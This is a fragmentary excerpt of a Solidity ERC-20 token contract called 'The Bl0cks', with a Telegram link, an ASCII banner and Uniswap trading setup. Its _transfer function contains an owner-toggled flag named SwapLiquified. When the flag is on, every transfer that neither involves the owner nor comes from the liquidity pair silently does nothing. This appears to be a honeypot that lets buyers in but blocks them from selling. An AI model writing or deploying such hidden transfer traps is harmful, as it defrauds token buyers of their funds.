...
telegram : https://t.me/theBl0cks

 ______   __  __     ______        ______     __         ______     ______     __  __     ______    
/\__  _\ /\ \_\ \   /\  ___\      /\  == \   /\ \       /\  __ \   /\  ___\   /\ \/ /    /\  ___\   
\/_/\ \/ \ \  __ \  \ \  __\      \ \  __<   \ \ \____  \ \ \/\ \  \ \ \____  \ \  _"-.  \ \___  \  
...
contract TheBl0cks is Context, IERC20, Ownable {
    ...
    string private constant _name = "The Bl0cks";
    string private constant _symbol = "Bl0cks";
    uint8 private constant _decimals = 9;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool public SwapLiquified = false;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && SwapLiquified){ return; }
    ...
    function openTrading() external onlyOwner() {
        ...
        // ERC 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
